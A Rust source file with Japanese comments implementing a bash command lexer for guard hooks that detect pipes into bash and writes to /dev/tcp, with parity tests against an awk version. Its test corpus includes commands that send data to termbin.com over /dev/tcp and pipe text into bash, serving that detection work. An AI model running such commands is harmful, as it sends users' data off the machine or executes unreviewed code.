//! bash の書き方のコマンドの文字を単純コマンドに分ける lexer。Linux の `nix/files/claude/hooks/xref-guard.sh` の awk (`install-iac-guard.sh` は
//! その写し、`gist-guard.sh` は送り先 (`> /dev/tcp/…`) を足したもの) を写した。読み方は awk と同じにする (awk を直したら、ここも直す。Linux の
//! 試験が awk と突き合わせる)。
//!
//! - `'…'`・`"…"`・`$'…'`・`\` を外して語にする。`${…}`・`$((…))` は語のまま
//! - `;` `&` `|` 改行 `(` `)` で分ける。`[[ … ]]` の中の `( ) | < > &` は分けない
//! - リダイレクトの先は、`< f` を stdin のファイル、`> f`・`>> f`・`>| f`・`&> f` (stdout) を書き先にし、ほか (`2> f`・`2>&1` の 1 など) は捨てる。
//!   here-string と heredoc の本文は stdin の本文にする。`/dev/tcp`・`/dev/udp` への書き込みは送り先として残す
//! - `$( )`・`` ` ` ``・`<( )` の中は、外を読み終えてから別の単純コマンドとしても読む。`$(cat <<EOF … EOF)` は heredoc の本文、`$(cat <file>)`・
//!   `$(< <file>)` はファイルの印 (`\u{2}<path>\u{3}`) を語に入れ、ほかは中の文字のまま
//! - `(( … ))` を飛ばす (`<<` を heredoc と読まない)。語の頭の `#` から行末まではコメント
//!
//! awk は 1 文字目を 1 と数えるが、ここは 0 から数える (位置の計算は awk の式を 1 ずらして写した)。

/// 単純コマンドの stdin
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub enum Stdin {
    #[default]
    None,
    /// heredoc・here-string の本文 (awk の `H<本文>`)
    Here(String),
    /// `< f` のファイル (awk の `F<path>`)
    File(String),
}

/// 単純コマンド 1 つ (awk の 1 レコード)
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Cmd {
    /// 前の単純コマンドの出力をパイプで受ける (awk の `P`)
    pub pipe: bool,
    pub stdin: Stdin,
    /// stdout の書き先 (無ければ空)
    pub outf: String,
    /// 送り先 (`/dev/tcp/…`・`/dev/udp/…` への書き込み)
    pub net: Vec<String>,
    /// 語。bash の `read -a` と同じく、末尾の空の語は落としてある
    pub words: Vec<String>,
    /// PowerShell の lexer が作った (コマンドの名前の別名を PowerShell のものとして読む)
    pub ps: bool,
}

/// `$(cat <file>)` の値に入れるファイルの印の頭と終わり
pub const MARK_OPEN: char = '\u{2}';
pub const MARK_CLOSE: char = '\u{3}';

/// コマンドの文字を単純コマンドに分ける。`net_records` は、語の無い単純コマンドも送り先があれば残すか (gist-guard の awk)。
pub fn split_commands(src: &str, net_records: bool) -> Vec<Cmd> {
    // awk は行に分けて読み、改行でつなぎ直す (末尾の改行 1 つは落ちる)
    let src = src.strip_suffix('\n').unwrap_or(src);
    let mut lx = Lexer {
        net_records,
        ..Lexer::default()
    };
    let chars: Vec<char> = src.chars().collect();
    lx.lex(&chars);
    lx.flush_cmd(false);
    // $( )・` `・<( ) の中は、外を読み終えてから別の単純コマンドとして読む (読む間に増えた分も)
    let mut qi = 0;
    while qi < lx.queue.len() {
        lx.pending.clear();
        lx.pipein = false;
        let inner: Vec<char> = lx.queue[qi].chars().collect();
        lx.lex(&inner);
        lx.flush_cmd(false);
        qi += 1;
    }
    let mut cmds = lx.cmds;
    for c in &mut cmds {
        while c.words.last().is_some_and(String::is_empty) {
            c.words.pop();
        }
    }
    cmds
}

#[derive(Default)]
struct Lexer {
    net_records: bool,
    word: String,
    inword: bool,
    /// 次の語の行き先: 0 = 語、1 = 捨てる、2 = stdin のファイル、3 = here-string、4 = stdout の書き先
    skip: u8,
    inbr: bool,
    words: Vec<String>,
    cur_stdin: Stdin,
    cur_outf: String,
    cur_net: Vec<String>,
    own_hd: bool,
    pipein: bool,
    cmds: Vec<Cmd>,
    /// 読みかけの heredoc (終わりの印・`<<-` か・本文を入れる単純コマンドの番号)
    pending: Vec<(String, bool, usize)>,
    queue: Vec<String>,
}

fn at(s: &[char], i: usize) -> Option<char> {
    s.get(i).copied()
}

fn sub_str(s: &[char], from: usize, to: usize) -> String {
    let to = to.min(s.len());
    if from >= to {
        return String::new();
    }
    s[from..to].iter().collect()
}

fn is_blank(c: Option<char>) -> bool {
    matches!(c, Some(' ' | '\t'))
}

/// heredoc の終わりの印を終える文字 (`[ \t\n;&|<>()]`)
fn ends_delim(c: char) -> bool {
    matches!(
        c,
        ' ' | '\t' | '\n' | ';' | '&' | '|' | '<' | '>' | '(' | ')'
    )
}

/// heredoc の終わりの印を読む (引用符と `\` は外す)。印の次の位置を返す
fn read_delim(s: &[char], mut i: usize) -> (String, usize) {
    let mut delim = String::new();
    while let Some(d) = at(s, i) {
        if ends_delim(d) {
            break;
        }
        if !matches!(d, '\'' | '"' | '\\') {
            delim.push(d);
        }
        i += 1;
    }
    (delim, i)
}

/// heredoc の本文と、本文を飛ばした先 (終わりの印の行の次)。`pos` は本文の 1 文字目
fn heredoc_read(s: &[char], pos: usize, delim: &str, strip: bool) -> (String, usize) {
    let n = s.len();
    if !strip {
        let pos = pos.min(n);
        let mut t = String::from("\n");
        t.extend(&s[pos..]);
        t.push('\n');
        let needle = format!("\n{delim}\n");
        if let Some(byte_k) = t.find(&needle) {
            let k = t[..byte_k].chars().count();
            return (
                sub_str(s, pos, pos + k),
                pos + k + 1 + delim.chars().count(),
            );
        }
        return (sub_str(s, pos, n), n);
    }
    let mut body = String::new();
    let mut pos = pos;
    while pos < n {
        let line: String;
        match s[pos..].iter().position(|&c| c == '\n') {
            Some(e) => {
                line = sub_str(s, pos, pos + e);
                pos += e + 1;
            }
            None => {
                line = sub_str(s, pos, n);
                pos = n;
            }
        }
        let line = line.trim_start_matches('\t');
        if line == delim {
            break;
        }
        body.push_str(line);
        body.push('\n');
    }
    (body, pos)
}

/// `"…"` の中の `$( )` の入れ子をたどる深さの上限。これより深いものは閉じないものとみなす (awk に上限は無いが、Windows の main thread の
/// stack は 1 MB しか無く、64 KB のコマンドで入れ子を 1 万段にすると溢れて hook が落ちる)
const MAX_NEST: usize = 200;

/// `s[j]` の `"` に対応する `"` の位置 (無ければ `s.len()`)
fn dq_end(s: &[char], j: usize, nest: usize) -> usize {
    let n = s.len();
    let mut j = j + 1;
    while j < n {
        let d = s[j];
        if d == '\\' {
            j += 2;
            continue;
        }
        if d == '"' {
            return j;
        }
        if d == '$' && at(s, j + 1) == Some('(') {
            j = paren_end_n(s, j + 1, nest + 1) + 1;
            continue;
        }
        if d == '`' {
            j = bt_end(s, j) + 1;
            continue;
        }
        j += 1;
    }
    n
}

/// `s[j]` の `` ` `` に対応する `` ` `` の位置 (無ければ `s.len()`)
fn bt_end(s: &[char], j: usize) -> usize {
    let n = s.len();
    let mut j = j + 1;
    while j < n {
        let d = s[j];
        if d == '\\' {
            j += 2;
            continue;
        }
        if d == '`' {
            return j;
        }
        j += 1;
    }
    n
}

/// `s[p]` の `(` に対応する `)` の位置 (無ければ `s.len()`)。引用符・`\`・`` ` ` ``・heredoc の本文・コメントの中の括弧は数えない
fn paren_end(s: &[char], p: usize) -> usize {
    paren_end_n(s, p, 0)
}

fn paren_end_n(s: &[char], p: usize, nest: usize) -> usize {
    let n = s.len();
    if nest > MAX_NEST {
        return n;
    }
    let mut depth = 0i64;
    let mut hds: Vec<(String, bool)> = Vec::new();
    let mut j = p;
    while j < n {
        let c = s[j];
        match c {
            '\\' => {
                j += 2;
                continue;
            }
            '\'' => {
                j += 1;
                while j < n && s[j] != '\'' {
                    j += 1;
                }
            }
            '"' => j = dq_end(s, j, nest),
            '`' => j = bt_end(s, j),
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return j;
                }
            }
            '#' => {
                let prev = if j > 0 { s[j - 1] } else { ' ' };
                if matches!(prev, ' ' | '\t' | '\n' | ';' | '&' | '|' | '(') {
                    match s[j..].iter().position(|&x| x == '\n') {
                        // 改行の手前へ (次の周で改行を読む)
                        Some(k) => j += k - 1,
                        None => return n,
                    }
                }
            }
            '<' if at(s, j + 1) == Some('<') => {
                if at(s, j + 2) == Some('<') {
                    j += 3;
                    continue;
                }
                j += 2;
                let mut strip = false;
                if at(s, j) == Some('-') {
                    strip = true;
                    j += 1;
                }
                while is_blank(at(s, j)) {
                    j += 1;
                }
                let (delim, e) = read_delim(s, j);
                if !delim.is_empty() {
                    hds.push((delim, strip));
                }
                j = e;
                continue;
            }
            '\n' if !hds.is_empty() => {
                let mut pos = j + 1;
                for (d, st) in hds.drain(..) {
                    pos = heredoc_read(s, pos, &d, st).1;
                }
                j = pos;
                continue;
            }
            _ => {}
        }
        j += 1;
    }
    n
}

/// `s[i]` からの `(( … ))` の終わり (算術の `<<` を heredoc と読まない)。awk と同じく、閉じなければ最後の文字
fn arith_end(s: &[char], i: usize) -> usize {
    let n = s.len();
    let mut q = 0i64;
    for (j, &d) in s.iter().enumerate().skip(i) {
        if d == '(' {
            q += 1;
        } else if d == ')' {
            q -= 1;
            if q == 0 {
                return j;
            }
        }
    }
    n.saturating_sub(1)
}

/// パスの字だけか (`[^ \t\n'"\\$`;&|<>()*?]+`)
fn plain_path(p: &str) -> bool {
    !p.is_empty()
        && !p.chars().any(|c| {
            matches!(
                c,
                ' ' | '\t'
                    | '\n'
                    | '\''
                    | '"'
                    | '\\'
                    | '$'
                    | '`'
                    | ';'
                    | '&'
                    | '|'
                    | '<'
                    | '>'
                    | '('
                    | ')'
                    | '*'
                    | '?'
            )
        })
}

/// `$( )` の中の文字 → 語に入れる値。`cat <<EOF … EOF` だけなら本文 (末尾の改行は `$( )` と同じく外す)、`cat <file>`・`< <file>` だけならファイルの
/// 印、ほかは中の文字のまま
pub fn subst_value(inner: &str) -> String {
    let t = inner.trim_start_matches([' ', '\t', '\n']);
    let tc: Vec<char> = t.chars().collect();
    if let Some(body) = cat_heredoc(&tc) {
        return body;
    }
    let rest = if let Some(r) = t.strip_prefix("cat") {
        let r2 = r.trim_start_matches([' ', '\t']);
        (r2.len() < r.len()).then_some(r2)
    } else {
        t.strip_prefix('<')
            .map(|r| r.trim_start_matches([' ', '\t']))
    };
    if let Some(p) = rest {
        let p = p.trim_end_matches([' ', '\t', '\n']);
        let quoted = |q: char, bad: &[char]| {
            p.len() >= 2
                && p.starts_with(q)
                && p.ends_with(q)
                && !p[1..p.len() - 1].contains(|c| c == q || bad.contains(&c))
        };
        let path = if quoted('\'', &[]) || quoted('"', &['$', '`', '\\']) {
            p[1..p.len() - 1].to_string()
        } else if plain_path(p) {
            p.to_string()
        } else {
            String::new()
        };
        if !path.is_empty() {
            return format!("{MARK_OPEN}{path}{MARK_CLOSE}");
        }
    }
    format!("$({inner})")
}

/// `cat[ \t]+(-[ \t]+)?<<[^<]` で始まり、heredoc の後ろに空白しか無ければ、その本文 (末尾の改行を外す)
fn cat_heredoc(t: &[char]) -> Option<String> {
    let n = t.len();
    if !(at(t, 0) == Some('c') && at(t, 1) == Some('a') && at(t, 2) == Some('t')) {
        return None;
    }
    let mut i = 3;
    if !is_blank(at(t, i)) {
        return None;
    }
    while is_blank(at(t, i)) {
        i += 1;
    }
    if at(t, i) == Some('-') && is_blank(at(t, i + 1)) {
        i += 1;
        while is_blank(at(t, i)) {
            i += 1;
        }
    }
    if !(at(t, i) == Some('<') && at(t, i + 1) == Some('<')) {
        return None;
    }
    match at(t, i + 2) {
        Some(c) if c != '<' => {}
        _ => return None,
    }
    i += 2;
    let mut strip = false;
    if at(t, i) == Some('-') {
        strip = true;
        i += 1;
    }
    while is_blank(at(t, i)) {
        i += 1;
    }
    let (delim, mut i) = read_delim(t, i);
    while is_blank(at(t, i)) {
        i += 1;
    }
    if delim.is_empty() || at(t, i) != Some('\n') {
        return None;
    }
    let (body, e) = heredoc_read(t, i + 1, &delim, strip);
    if t[e.min(n)..]
        .iter()
        .any(|&c| !matches!(c, ' ' | '\t' | '\n'))
    {
        return None;
    }
    Some(body.trim_end_matches('\n').to_string())
}

impl Lexer {
    fn add_char(&mut self, s: &str) {
        self.word.push_str(s);
        self.inword = true;
    }

    fn flush_word(&mut self) {
        if self.inword {
            let word = std::mem::take(&mut self.word);
            // /dev/tcp・/dev/udp への書き込み (> f・>> f・<> f・2> f など。< f は読むだけ) は、送り先として残す
            if (self.skip == 1 || self.skip == 4)
                && (word.starts_with("/dev/tcp/") || word.starts_with("/dev/udp/"))
            {
                self.cur_net.push(word.clone());
            }
            match self.skip {
                1 => self.skip = 0,
                2 => {
                    self.cur_stdin = Stdin::File(word);
                    self.skip = 0;
                }
                3 => {
                    self.cur_stdin = Stdin::Here(format!("{word}\n"));
                    self.skip = 0;
                }
                4 => {
                    self.cur_outf = word;
                    self.skip = 0;
                }
                _ => {
                    if word == "[[" {
                        self.inbr = true;
                    }
                    if word == "]]" {
                        self.inbr = false;
                    }
                    self.words.push(word);
                }
            }
        }
        self.word.clear();
        self.inword = false;
    }

    /// 単純コマンドを 1 つ閉じる。`pipe` なら、次の単純コマンドの stdin はこのコマンドの出力
    fn flush_cmd(&mut self, pipe: bool) {
        self.flush_word();
        let mut stored = false;
        let keep = !self.words.is_empty()
            || self.cur_stdin != Stdin::None
            || self.own_hd
            || (self.net_records && !self.cur_net.is_empty());
        if keep {
            self.cmds.push(Cmd {
                pipe: self.pipein,
                stdin: std::mem::take(&mut self.cur_stdin),
                outf: std::mem::take(&mut self.cur_outf),
                net: std::mem::take(&mut self.cur_net),
                words: std::mem::take(&mut self.words),
                ps: false,
            });
            stored = true;
        }
        self.words.clear();
        self.skip = 0;
        self.inbr = false;
        self.cur_stdin = Stdin::None;
        self.cur_outf.clear();
        self.cur_net.clear();
        self.own_hd = false;
        // a |<改行> b のように、空のコマンドではパイプを切らない
        if stored || pipe {
            self.pipein = pipe;
        }
    }

    /// `s[p]` の `(` で始まる `$( )`・`<( )`・`>( )` (kind は `$` `<` `>`) を読み、語に値を足す。閉じる位置を返す
    fn subst(&mut self, s: &[char], p: usize, kind: char) -> usize {
        let e = paren_end(s, p);
        let inner = sub_str(s, p + 1, e);
        self.queue.push(inner.clone());
        if kind == '$' {
            let v = subst_value(&inner);
            self.add_char(&v);
        } else {
            self.add_char(&format!("{kind}({inner})"));
        }
        e
    }

    /// `s[i]` の `` ` `` で始まる `` ` ` `` を読み、語に値を足す。閉じる位置を返す
    fn subst_bt(&mut self, s: &[char], i: usize) -> usize {
        let e = bt_end(s, i);
        let inner = sub_str(s, i + 1, e).replace("\\`", "`");
        self.queue.push(inner.clone());
        let v = subst_value(&inner);
        self.add_char(&v);
        e
    }

    /// `s[p]` の `'` で始まる `$'…'` を読む (`\n`・`\t` を文字に戻す)。閉じる位置を返す
    fn ansi_c(&mut self, s: &[char], p: usize) -> usize {
        let n = s.len();
        self.inword = true;
        let mut j = p + 1;
        while j < n {
            let d = s[j];
            if d == '\\' {
                match at(s, j + 1) {
                    Some('n') => self.word.push('\n'),
                    Some('t') => self.word.push('\t'),
                    Some(e) => self.word.push(e),
                    None => {}
                }
                j += 2;
                continue;
            }
            if d == '\'' {
                break;
            }
            self.word.push(d);
            j += 1;
        }
        j
    }

    fn lex(&mut self, s: &[char]) {
        let n = s.len();
        let mut i = 0;
        while i < n {
            let c = s[i];
            match c {
                '\\' => {
                    match at(s, i + 1) {
                        Some('\n') => {}
                        Some(c2) => self.add_char(&c2.to_string()),
                        None => self.add_char(""),
                    }
                    i += 1;
                }
                '\'' => {
                    let mut j = i + 1;
                    while j < n && s[j] != '\'' {
                        j += 1;
                    }
                    let v = sub_str(s, i + 1, j);
                    self.add_char(&v);
                    i = j;
                }
                '"' => {
                    self.inword = true;
                    i += 1;
                    while i < n {
                        let d = s[i];
                        if d == '\\' {
                            match at(s, i + 1) {
                                Some(c2 @ ('"' | '\\' | '$' | '`')) => {
                                    self.word.push(c2);
                                    i += 2;
                                    continue;
                                }
                                Some('\n') => {
                                    i += 2;
                                    continue;
                                }
                                _ => {
                                    self.word.push(d);
                                    i += 1;
                                    continue;
                                }
                            }
                        }
                        if d == '"' {
                            break;
                        }
                        if d == '$' && at(s, i + 1) == Some('(') && at(s, i + 2) != Some('(') {
                            i = self.subst(s, i + 1, '$') + 1;
                            continue;
                        }
                        if d == '`' {
                            i = self.subst_bt(s, i) + 1;
                            continue;
                        }
                        self.word.push(d);
                        i += 1;
                    }
                }
                '$' => {
                    let c2 = at(s, i + 1);
                    if c2 == Some('\'') {
                        i = self.ansi_c(s, i + 1);
                    } else if c2 == Some('(') && at(s, i + 2) != Some('(') {
                        i = self.subst(s, i + 1, '$');
                    } else if c2 == Some('(') || c2 == Some('{') {
                        // $((…)) と ${…} は、対になる閉じ括弧までを語のまま足す
                        let open = c2.unwrap();
                        let close = if open == '(' { ')' } else { '}' };
                        let mut q = 0i64;
                        let mut j = i + 1;
                        while j < n {
                            let d = s[j];
                            if d == open {
                                q += 1;
                            } else if d == close {
                                q -= 1;
                                if q == 0 {
                                    break;
                                }
                            }
                            j += 1;
                        }
                        let v = sub_str(s, i, j + 1);
                        self.add_char(&v);
                        i = j;
                    } else {
                        self.add_char("$");
                    }
                }
                '(' | ')' | '|' | '<' | '>' | '&' if self.inbr => self.add_char(&c.to_string()),
                '`' => i = self.subst_bt(s, i),
                '(' => {
                    if !self.inword && self.words.is_empty() && at(s, i + 1) == Some('(') {
                        i = arith_end(s, i);
                    } else {
                        self.flush_cmd(false);
                    }
                }
                ')' | ';' => self.flush_cmd(false),
                '|' => {
                    if at(s, i + 1) == Some('|') {
                        i += 1;
                        self.flush_cmd(false);
                    } else {
                        if at(s, i + 1) == Some('&') {
                            i += 1;
                        }
                        self.flush_cmd(true);
                    }
                }
                '&' => {
                    if at(s, i + 1) == Some('>') {
                        // &> f・&>> f は stdout の書き先
                        self.flush_word();
                        i += 1;
                        if at(s, i + 1) == Some('>') {
                            i += 1;
                        }
                        self.skip = 4;
                    } else {
                        if at(s, i + 1) == Some('&') {
                            i += 1;
                        }
                        self.flush_cmd(false);
                    }
                }
                '<' | '>' => {
                    // 2> の 2 は fd なので語にしない
                    let mut fd = String::new();
                    if self.inword
                        && !self.word.is_empty()
                        && self.word.chars().all(|d| d.is_ascii_digit())
                    {
                        fd = std::mem::take(&mut self.word);
                        self.inword = false;
                    } else {
                        self.flush_word();
                    }
                    let c2 = at(s, i + 1);
                    if c2 == Some('(') {
                        i = self.subst(s, i + 1, c);
                    } else if c == '<' && c2 == Some('<') {
                        if at(s, i + 2) == Some('<') {
                            i += 2;
                            self.skip = 3;
                        } else {
                            // heredoc: 終わりの印を覚え、次の改行の後ろで本文を読む
                            i += 2;
                            let mut strip = false;
                            if at(s, i) == Some('-') {
                                strip = true;
                                i += 1;
                            }
                            while is_blank(at(s, i)) {
                                i += 1;
                            }
                            let (delim, e) = read_delim(s, i);
                            // 印を終えた文字の手前へ (次の周でその文字を読む)。e は少なくとも i (2 以上)
                            i = e - 1;
                            let idx = self.cmds.len();
                            self.pending.push((delim, strip, idx));
                            self.own_hd = true;
                        }
                    } else {
                        // < f は stdin のファイル、> f・>> f・>| f は stdout の書き先 (書いた中身を後ろの --body-file・-F で読む)。
                        // <& <> >& と 2> などの先は捨てる
                        self.skip = if c == '<' {
                            if c2 != Some('&') && c2 != Some('>') {
                                2
                            } else {
                                1
                            }
                        } else if c2 != Some('&') && (fd.is_empty() || fd == "1") {
                            4
                        } else {
                            1
                        };
                        while matches!(at(s, i + 1), Some('>' | '&' | '|')) {
                            i += 1;
                        }
                    }
                }
                '\n' => {
                    self.flush_cmd(false);
                    if !self.pending.is_empty() {
                        let mut pos = i + 1;
                        for (d, st, idx) in std::mem::take(&mut self.pending) {
                            let (body, e) = heredoc_read(s, pos, &d, st);
                            pos = e;
                            if let Some(cmd) = self.cmds.get_mut(idx) {
                                cmd.stdin = Stdin::Here(body);
                            }
                        }
                        // 本文を飛ばした先の手前へ (pos は i + 1 以上)
                        i = pos - 1;
                    }
                }
                ' ' | '\t' => self.flush_word(),
                '#' if !self.inword => match s[i..].iter().position(|&x| x == '\n') {
                    // 改行の手前へ (次の周で改行を読む)
                    Some(k) => i += k - 1,
                    None => i = n,
                },
                _ => self.add_char(&c.to_string()),
            }
            i += 1;
        }
    }
}

#[cfg(test)]
mod tests {
    //! ## 確かめること
    //!
    //! - 引用符・`$'…'`・`\`・コメント・`[[ ]]`・`(( ))`・リダイレクト・heredoc (`<<-` も)・here-string・パイプ・`$( )` の値 (heredoc の本文・
    //!   ファイルの印・中の文字) を awk と同じに読む
    //! - awk の lexer (Linux の xref-guard.sh・gist-guard.sh の本文) と、いろいろなコマンドで同じレコードを出す (bash と awk がある Linux)

    use super::*;

    fn words(src: &str) -> Vec<Vec<String>> {
        split_commands(src, false)
            .into_iter()
            .map(|c| c.words)
            .collect()
    }

    fn w(list: &[&[&str]]) -> Vec<Vec<String>> {
        list.iter()
            .map(|c| c.iter().map(|s| s.to_string()).collect())
            .collect()
    }

    #[test]
    fn quotes_and_separators() {
        assert_eq!(
            words("git commit -m 'a b' && gh pr create --title \"x $y\""),
            w(&[
                &["git", "commit", "-m", "a b"],
                &["gh", "pr", "create", "--title", "x $y"]
            ])
        );
        assert_eq!(
            words("echo $'a\\nb' a\\ b # c\nls"),
            w(&[&["echo", "a\nb", "a b"], &["ls"]])
        );
        assert_eq!(
            words("[[ a == (b) ]] || x"),
            w(&[&["[[", "a", "==", "(b)", "]]"], &["x"]])
        );
        assert_eq!(words("(( a << 2 )); b"), w(&[&["b"]]));
    }

    #[test]
    fn redirections_and_heredocs() {
        let c = split_commands(
            "cat <<'EOF' > out.md\nbody 1)\nEOF\ngh pr create -F out.md",
            false,
        );
        assert_eq!(c[0].words, vec!["cat"]);
        assert_eq!(c[0].stdin, Stdin::Here("body 1)\n".to_string()));
        assert_eq!(c[0].outf, "out.md");
        assert_eq!(c[1].words, vec!["gh", "pr", "create", "-F", "out.md"]);
        let c = split_commands("x <<< 'hi' 2>&1 < in.txt", false);
        assert_eq!(c[0].stdin, Stdin::File("in.txt".to_string()));
        let c = split_commands("cat <<-E | bash\n\tgit push\n\tE", false);
        assert_eq!(c[0].stdin, Stdin::Here("git push\n".to_string()));
        assert!(c[1].pipe);
    }

    #[test]
    fn substitution_values() {
        assert_eq!(subst_value("cat <<'EOF'\na\nb\n\nEOF\n"), "a\nb");
        assert_eq!(subst_value(" cat body.md"), "\u{2}body.md\u{3}");
        assert_eq!(subst_value("< \"b c.md\""), "\u{2}b c.md\u{3}");
        assert_eq!(subst_value("printf x"), "$(printf x)");
        let c = split_commands("gh pr create --body \"$(cat <<'EOF'\n1) a\nEOF\n)\"", false);
        assert_eq!(c[0].words[4], "1) a");
        // 中のコマンドも別の単純コマンドとして読む
        assert_eq!(c[1].words, vec!["cat"]);
    }

    /// 引用符の中の $( ) を深く入れ子にしても stack が溢れない (Windows の main thread の stack は 1 MB)
    #[test]
    fn deep_nesting_does_not_overflow() {
        let src = "echo \"$(".repeat(1000);
        assert!(!split_commands(&src, false).is_empty());
    }

    #[test]
    fn net_targets() {
        let c = split_commands("echo hi > /dev/tcp/termbin.com/9999", true);
        assert_eq!(c[0].net, vec!["/dev/tcp/termbin.com/9999"]);
        assert_eq!(split_commands("> /dev/tcp/a/1", true).len(), 1);
        assert_eq!(split_commands("> /dev/tcp/a/1", false).len(), 0);
    }

    /// awk の lexer と同じレコードを出す
    #[test]
    fn matches_awk() {
        if !crate::hooks::parity::available() {
            return;
        }
        let corpus = [
            "git push -u origin feat",
            "gh pr create --title 'x' --body \"$(cat <<'EOF'\n## 概要\n- a/b#1 を待つ\nEOF\n)\"",
            "cat <<'EOF' | gh pr create -t x -F -\nNixOS/nixpkgs#1\nEOF",
            "BODY=$(cat <<'EOF'\nx\nEOF\n)\ngh pr create --title x --body \"$BODY\"",
            "cd sub && gh pr create -t x -F body.md; echo done",
            "bash -c \"gh pr create --title 'a' --body y\" 2>&1 | tee log >/dev/null",
            "git commit -m \"$(printf '%s' 'x')\" && git push",
            "echo $'a\\tb' \"q\\\"x\" `date` $((1+2)) ${HOME}/x",
            "[[ -n $x ]] && (cd /tmp; ls) || { echo a; }",
            "cat > f <<-EOF\n\tx\n\tEOF\ncat f",
            "a |\nb",
            "x <<< 'here' 2> err >> out",
            "exec 3<> /dev/tcp/termbin.com/9999; echo hi >&3",
            "( echo x ) > /dev/tcp/a/1",
            "diff <(ls a) <(ls b) # comment ) here\nnext",
            "printf '%s\\n' 'a' | bash",
            "gh pr create --body \"$(cat body.md)\" --title=\"t\"",
            "python3 - <<'PY'\nprint(1)\nPY\n",
            "x='unterminated",
            "trailing \\",
            "for i in 1 2; do git push; done",
            "echo \"a $(echo \")\") b\"",
            "cat <<A; cat <<B\n1\nA\n2\nB\n",
        ];
        let awk_src = std::fs::read_to_string(crate::hooks::parity::repo_file(
            "nix/files/claude/hooks/gist-guard.sh",
        ))
        .unwrap();
        let body: String = awk_src
            .lines()
            .skip_while(|l| !l.ends_with("<<'AWK' || true"))
            .skip(1)
            .take_while(|l| *l != "AWK")
            .map(|l| format!("{l}\n"))
            .collect();
        for src in corpus {
            let out = std::process::Command::new("awk")
                .env("LC_ALL", "C")
                .arg(&body)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .spawn()
                .and_then(|mut ch| {
                    use std::io::Write;
                    ch.stdin.take().unwrap().write_all(src.as_bytes())?;
                    ch.wait_with_output()
                })
                .expect("awk を起こせない");
            let awk_text = String::from_utf8_lossy(&out.stdout).into_owned();
            let mut awk_cmds: Vec<Cmd> = Vec::new();
            for rec in awk_text.split('\u{1e}').filter(|r| !r.is_empty()) {
                let f: Vec<&str> = rec.split('\u{1f}').collect();
                let stdin = match f.get(1) {
                    Some(s) if s.starts_with('H') => Stdin::Here(s[1..].to_string()),
                    Some(s) if s.starts_with('F') => Stdin::File(s[1..].to_string()),
                    _ => Stdin::None,
                };
                let net: Vec<String> = f
                    .get(3)
                    .filter(|s| !s.is_empty())
                    .map(|s| s.split('\u{1c}').map(str::to_string).collect())
                    .unwrap_or_default();
                let mut words: Vec<String> = f.iter().skip(4).map(|s| s.to_string()).collect();
                while words.last().is_some_and(String::is_empty) {
                    words.pop();
                }
                awk_cmds.push(Cmd {
                    pipe: f[0] == "P",
                    stdin,
                    outf: f.get(2).unwrap_or(&"").to_string(),
                    net,
                    words,
                    ps: false,
                });
            }
            assert_eq!(split_commands(src, true), awk_cmds, "{src:?}");
        }
    }
}
